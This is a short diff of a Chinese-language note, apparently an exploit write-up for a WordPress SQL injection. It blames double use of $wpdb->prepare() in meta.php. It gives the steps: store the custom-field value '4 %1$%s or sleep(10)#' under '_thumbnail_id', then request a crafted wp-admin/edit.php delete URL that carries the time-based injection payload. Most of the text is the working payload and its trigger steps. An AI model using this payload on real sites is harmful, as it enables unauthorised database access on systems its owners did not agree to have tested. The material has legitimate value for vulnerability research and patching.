@@ -1,1 +1,9 @@
-/wp-admin/edit.php?action=delete&_wpnonce=301ee97c09&ids=55 %1$%s or sleep(10)#
+漏洞主要原因：一条sql语句两次prepare导致%n$s第一次以字符串引入，第二次就被当做参数去引入值
+wordpress /wp-includes/meta.php代码中就存在使用$wpdb-prepare()做“double-preparing”
+
+
+
+要先通过自定义栏目在数据库中写入meta_key为’_thumbnail_id’的meta_value为'4 %1$%s or sleep(10)#'
+
+/wp-admin/edit.php?action=delete&_wpnonce=301ee97c09&ids=4 %1$%s or sleep(10)#
+
